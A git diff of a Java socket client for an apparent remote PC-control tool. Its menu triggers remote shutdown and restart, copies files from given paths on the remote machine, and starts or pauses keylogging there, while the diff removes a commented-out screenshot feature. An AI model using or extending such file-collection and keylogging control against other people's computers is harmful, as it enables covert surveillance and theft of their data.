@@ -1,6 +1,4 @@
-import java.awt.*;
 import java.io.BufferedReader;
-import java.io.File;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
 import java.net.Socket;
@@ -25,10 +23,9 @@ public class Client {
                 System.out.println("1. Shutdown (After 15')");
                 System.out.println("2. Restart (After 15')");
                 System.out.println("3. Cancel Shutdown/ Restart");
-                //System.out.println("4. Screenshot");
-                System.out.println("5. Collect File (via user disk address)");
-                System.out.println("6. Start keyLogging");
-                System.out.println("7. Pause and Return keyLogging");
+                System.out.println("4. Collect File (via user disk address)");
+                System.out.println("5. Start KeyLogging");
+                System.out.println("6. Pause and Return keyLogging");
 
                 int choice = sc.nextInt();
                 sc.nextLine();
@@ -56,27 +53,9 @@ public class Client {
                         System.out.println(reader.readLine());
                         break;
 
-//                    case 4:
-//                        writer.println("screenshot");
-//                        writer.flush();
-//
-//                        int imageSize = Integer.parseInt(reader.readLine());
-//                        byte[] imageBytes = new byte[imageSize];
-//                        int byteReadImage = socket.getInputStream().read(imageBytes);
-//
-//                        if (byteReadImage > 0) {
-//                            System.out.println("Insert image address & name: ");
-//                            String imageAddress = sc.nextLine();
-//                            Path imagePath = Paths.get(imageAddress + ".png");
-//                            Files.write(imagePath, imageBytes);
-//                            System.out.println("A new screenshot has been added to: " + imageAddress);
-//                        }
-//                        break;
-
-                    case 5:
+                    case 4:
                         System.out.println("Insert the server path to the file: ");
                         String filePathServer = sc.nextLine();
-
                         writer.println("collect-" + filePathServer);
                         writer.flush();
 
@@ -93,7 +72,8 @@ public class Client {
                         }
 
                         if (totalBytesRead == fileSize) {
-                            String fileAddress = "D:/Projects/network-pc-remote-control/remote-control/src/";
+                            String fileAddress = Paths.get("").toAbsolutePath().toString() + "/";
+                            System.out.println(fileAddress);
                             System.out.println("Insert file name: ");
                             String fileName = sc.nextLine();
 
@@ -109,15 +89,14 @@ public class Client {
                         } else {
                             System.out.println("Incomplete file transfer.");
                         }
-
                         break;
 
-                    case 6:
+                    case 5:
                         writer.println("keylogging-start");
                         writer.flush();
                         break;
 
-                    case 7:
+                    case 6:
                         writer.println("keylogging-end");
                         writer.flush();
                         break;
